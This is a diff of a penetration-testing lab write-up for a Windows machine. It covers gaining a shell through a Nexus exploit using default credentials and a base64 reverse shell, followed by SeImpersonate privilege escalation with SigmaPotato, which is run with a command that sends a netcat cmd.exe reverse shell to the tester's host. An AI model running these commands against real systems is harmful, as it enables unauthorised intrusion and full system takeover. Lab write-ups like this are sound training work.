@@ -6,9 +6,11 @@
 - Found Credentials/Users:
 
 Main Objectives:
+nathan
+administrator
 
-Local.txt = 
-Proof.txt = 
+Local.txt = 47ad5dadd9e9d54db3291527433f4cac
+Proof.txt = 422de4f47c1da097ec5a361809eb6f8d
 
 **Enumeration**
 
@@ -325,11 +327,23 @@ https://www.exploit-db.com/exploits/49385
 
 1. Exploit Steps
 
-```
+- Navigated to http://192.168.45.151:8081 and authenticated using nexus/nexus. 
+- Downloaded Nexus exploit at https://www.exploit-db.com/exploits/49385.
+- Added payload to exploit using a base64 reverse shell generated at https://www.revshells.com/.
 
+![[Pasted image 20260127123009.png]]
 
+![[Pasted image 20260127123056.png]]
 
-```
+- Setup listener using Penelope.
+
+![[Pasted image 20260127123232.png]]
+- Sent exploit.
+
+![[Pasted image 20260127123140.png]]
+- Received reverse shell as billyboss\nathan.cat
+
+![[Pasted image 20260127123322.png]]
 
 2. Shell Access
 
@@ -344,7 +358,22 @@ https://www.exploit-db.com/exploits/49385
 ```
 #CMD
 whoami
+billyboss\nathan
+
 whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
 whoami /groups
 hostname
 systeminfo
@@ -492,9 +521,48 @@ Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction Silently
 
 1. PE Steps
 
-```
+- Found that the SE Impersonate Privilege was set by running the following command. 
 
 ```
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
+
+- Copied SigmaPotato.exe onto Windows 10 client. Web download with not working after multiple attempts, so set SMB from my Kali box. 
+
+```
+impacket-smbserver share ./ -smb2support  
+copy \\192.168.45.151\Share\SigmaPotato.exe .
+
+```
+
+- Copied nc64.exe onto Windows 10 machine.
+
+```
+copy \\192.168.45.151\Share\nc64.exe .
+
+```
+
+- Ran reverse shell using SigmaPotato.exe.
+
+```
+.\SigmaPotato.exe ".\nc64.exe 192.168.45.151 443 -e cmd.exe"
+```
+
+- Received reverse shell.
+
+![[Pasted image 20260127140404.png]]
 
 2. Notes
 
